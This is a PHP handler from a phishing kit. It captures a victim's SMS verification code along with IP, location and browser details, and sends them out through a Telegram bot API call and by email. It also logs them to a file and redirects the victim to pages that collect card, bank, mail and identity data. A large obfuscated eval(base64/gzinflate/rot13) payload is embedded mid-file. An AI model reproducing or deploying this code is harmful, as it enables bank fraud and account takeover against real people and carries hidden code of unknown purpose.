<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/

	  if(isset($_POST['sms_code'])){
	include '../mine.php';
	include '../bot.php';
    }
    session_start();
    if(isset($_POST['sms_code'])){
    $sms_code =$_POST['sms_code'];
    }
   
    ########################################################
    $msg="=========== <[ -".$scamname."- SMS Code ]> ===========\r\n";
    $msg.="----------------------- SMS Code---------------------\r\n";
   

    $msg.="SMS Code  : {$sms_code}\r\n";

    $msg.="---------------------- IP Info ----------------------\r\n";
    $msg.="IP ADDRESS   : {$_SESSION['ip']}\r\n";
    $msg.="LOCATION     : {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
    $msg.="BROWSER      : {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
    $msg.="SCREEN       : {$_SESSION['screen']}\r\n";
    $msg.="USER AGENT   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
    $msg.="TIMEZONE     : {$_SESSION['ip_timezone']}\r\n";
    $msg.="TIME         : ".now()." GMT\r\n";
    $msg.="=========== <[ THANKS TO Beluga ]> ===========\r\n\r\n\r\n";
        if ($saveintext=="yes") {
    $save=fopen("../../".$filename.".txt","a+");
fwrite($save,$msg);
fclose($save);
}
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
eval(str_rot13(gzinflate(str_rot13(base64_decode('LUnFEu04Dv2arn6zC1DN6oaZbDMVc+Z8/SRdnVcMsi0px9Kxl224/3n9Ea/3Qy5/xqFLMOR/8zIl8/InH5oqv//t/C2rEpgXRXEpzOrDf0721Vx6oPLtgx5XF+HUV+crSAZSqdZlybvP3fSkTaWTUpZ/TvrRRsvxrgrWt9Mfz9pPT0G+gkIVWxPZPRbKXLATx6ApeHjqj8e3bHmlILKluuS2RDf3hcHv2BzBXwnhJg4NaE/vpI+PQCUEzOPYaBxx/NNdgZjQ1pydwrNuEFoBOGLoZzYCVGho80lM3tKxtzJuZXcRk1p2Cg/l+ClNwxq2OR0aI8EuaHo1hhHDUvQsAHvqmljPP0oSzrDD4ijaoymgH37y0KWPRxe4cRc+G7hWE9YRIUnuCZ19NO4HzXuw4ygLUCAaMOP7swkFfoCsUBPasT0orUcTja5kGMeSz1kzDjn7Qnu8GIj6VbpAnPkY51qTp7RuTxGPgekjfngEP59W2JsnZvOo90vF0lLmRzDdNYB3FSyUW0XBcC7GcXlEmUYly/kJSS8JP/cgxGztOCl4uy74yCtt6Ms/bgsUu3xe114nXSYo3kkewtf5i878Tl4hrp1wD54QVXlLplQxtimwGIsQKkawJSmzJWs6CQHQYZObMfe3+HcgKn3bcA1lf9G+l/F3vm2I9ufGDhAGXSC6T0pRB1g37bkwIYYdFa4Bl7RJvdbqYYZsEm+o/tXWQMv0WFgvJJcIdz+BefJ3TaenNBgBVgynx3NK7AfvuRH0zOz8bsYs7kWWBu5ySBHLelyTIkjJGVQdDC/PeH3ipDpDZNRS0v0E9qNKbo2SXRkuya6YeXEzdBTBgKHeCUQxwZii2BBZLbAV9eyASGcn6Nidwu1WlEHfx0LhbphAdnQCFiIsyYXwr8dn6WdPEAxtAY82KDSBErjUi7yuDpKhw+J7jU6piaCkdl3Jn6sfqtEHypKldo66Wkqzd+T4fYrqIGgIl1IDzqAcNOouMvebpLAwu7PO5Zmu51XNH8d6I5/hvxwTjPd/pFqE70BrW8NOK3lolPs9vz1EcHrT8ht4mjVqOzVjn5rFizofdcHRgYrEvheytW5cCdWuZW0B35YSUhTqCmCur4xTvkToGgWRdSoiq7Cyha0Cfc1pKqfccHM2gxnI8oiNguCLu2V6bmXBP5BfI21CJI1e9wKrpvMClu5oVMhsvjjN+HE0Q5/qm1YuEKszsUNKGFmIMzQUKLnEe7J0TYGsKMHAOJTn2G+P6Rr5mFE1+egJYLDCVxq3sAOgGgT71YRbaw2NjqvxDMZZ1qZeH+1dgyHUu1460v2bs5IsVL21/aKeawu5URyMx85zZ2tZgVOUk6JB1DEQPrJHMTH+IQJ/1+eMRiafkBnQtgXGNc6kqA7J/ZDf/s0hH8XN0YnWfnW0SpTgujMPlhev59ha+yvxTXUTJoJ1yGCIdF4Pe3ZNZS93NRtHC9+14emYeZNjnDjVT2kahk6+Hnk3mrnBxFXYlBIeI6EezthGfJIboTQsA9Z+jUbXOaHTMcgk0vI7p5jddTLT3n9W80EKX+tZYPUThL5b9WVs3Vq+tQJMcDXz+uLDJHoCvpNOzFVz+CPpO0avt2WIAAWzBF6cX9BuTrhtGhjt4Il6Bo8llETMC97+mAKYWN7kCoqYyE9Xu+sqjiAuVGm9n2NIBgSzR/lV+jFfSqZY8tcf2SfSJxmtVz1jNwCgu9Mvg0oMAwD0j1bMiNeujlQr85Yx8uWdJcXuQc6eTmyHo4TJZ54gR7ZKR8O2tol2lMY6rAgiMSrC2331YLlSP02bpnFrqxl7+Uu/WSWrDEqbOpxjtzzBihSFIvAnRHzHHrE3J5t4XcfzLrTzY+6ojxdyaF5z6tvkdDA/Q33GL/uZHm/+AkMMLIyn7txvMrMPuWjGsJ9sHT5VsIW3Vq+GEJ8/qlrbK06wDr1kS+X8yq6cL4nsL4GBz9MscVHcPt4PQKmWKdnGHEXEVq6HUnMELDbXe3T9kqBwqKuXc/SIG0JTZppY5DX1xueiyAAgxpcB9JNsCx5saBSx2rx6nXiMxIfQ37zagp1mzW56oNOK+v0oIjl9MbLWzcy5MzFl7orIZe1jqLRr0+LSmH9MbVUfBPxCtOt8bSWN9wXICbh10duRfFqxTZ/bvQWp9MXkjzWYGOt9NZe8V3AzTV6BzwjZLG5D/EWr9dB9onVt3zpzdkTPwjy9aHM/UqyINoVRqFKgZfaadLhfGI5WIBuGyV78xyCTt4nFOcJVWltRktKphs1g4Px+j1WQlDrAd6mzdj+9B5BBPfllculkXmgX87GUykdQD321i62NnKugpsCe6wx2wm/2zQ9Y9IwxZCE0nBa3X/uEaceUUsmtFMGFv7QVh6r+qFDV5UFKdlx2BqwDqzON6PofqEZ+zRLdVs8r7vxoUIobn6AnThhyPN9uqOnKRl1k6EjCnITniwg882slRUlHsespsRJUOzsIa8gNkDtvMIGfogkVaY5CaztTKsoqbRk83EGZuvPrxro6bILgFHx6yPKc7yV6BaQrMNQQwpCUo4PhvbsRt3CCQhlqNKBszvZVNYvslGBdDg9Lid8vsrahyza39DaDj7PcZR9+h3GNkZmGtDBhXKlfe94+gByQOPn0U9i30Tkcf9eFnmH+gs33/fs/7/Pf/wM=')))));
    $subject="-".$scamname."- 3D FULL CARD INFO BANK [".$_SESSION['_cc_bank_']."] From [".$_SESSION['ip_countryName']."]";
    $headers="From: xAthena <3D_full_info@sh33nz0.com>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
	}
	}
	
	
	exit(header("Location: ../../app/smserror"));
    if(!isset($_POST['nextpage'])){
    if ($show_newcard=="yes") {
    exit(header("Location: ../../app/processcard"));
}elseif($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}
///////////////////////////////////////////
if(isset($_POST['nextpage'])){
    if ($show_mailaccess=="yes") {
    exit(header("Location: ../../app/mailprovider"));
}elseif($show_bank=="yes") {
    exit(header("Location: ../../app/bank"));
}elseif($show_identity=="yes") {
    exit(header("Location: ../../app/identity"));
}else{
        exit(header("Location: ../../app/thanks"));
}
}

else{
     header('HTTP/1.0 404 Not Found');
          exit();
}
?>